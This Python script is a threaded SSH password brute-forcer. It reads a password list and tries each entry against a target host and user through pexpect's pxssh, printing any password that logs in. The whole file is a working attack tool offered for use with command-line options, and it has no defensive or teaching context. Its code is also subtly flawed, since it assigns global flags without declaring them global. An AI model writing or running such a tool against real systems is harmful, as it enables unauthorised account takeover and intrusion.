# encoding: utf-8
import optparse
from threading import Thread, Lock, Semaphore
import os
from pexpect import pxssh

global Found
Found = False
global target_pwd
target_pwd = ""
print_lock = Lock()
print_sem = Semaphore(5)


def connection(host, user, passwd):
    try:

        print_sem.acquire()
        print('try passwd:{0}'.format(passwd))
        s = pxssh.pxssh()
        s.login(host, user, passwd)
        Found = True
        target_pwd = passwd

        if Found:
            print("found password:{2} for user:{0} on host:{1}".format(target_user, target_host, target_pwd))
    except Exception as e:
        print(e)
        print("can't not login!")
    finally:
        print_sem.release()

if __name__ == "__main__":
    parser = optparse.OptionParser("usage %prog -H <target_host> -u <target_user> -p <passwd_file>")
    parser.add_option('-H', dest="target_host")
    parser.add_option('-u', dest="target_user")
    parser.add_option("-p", dest='target_pwd_file')
    (options, args) = parser.parse_args()
    target_host = options.target_host
    target_user = options.target_user
    target_pwd_file = options.target_pwd_file
    if target_host is None or target_user is None or target_pwd_file is None:
        print(parser.usage)
        exit(0)
    if os.path.isfile(target_pwd_file):
        with open(target_pwd_file) as f:
            one_line = f.readline().strip()
            while one_line:
                # connection(target_host, target_user, one_line)
                thd = Thread(target=connection, args=(target_host, target_user, one_line))
                thd.start()
                one_line = f.readline().strip()
    # connection(target_host, target_user, target_pwd_file)

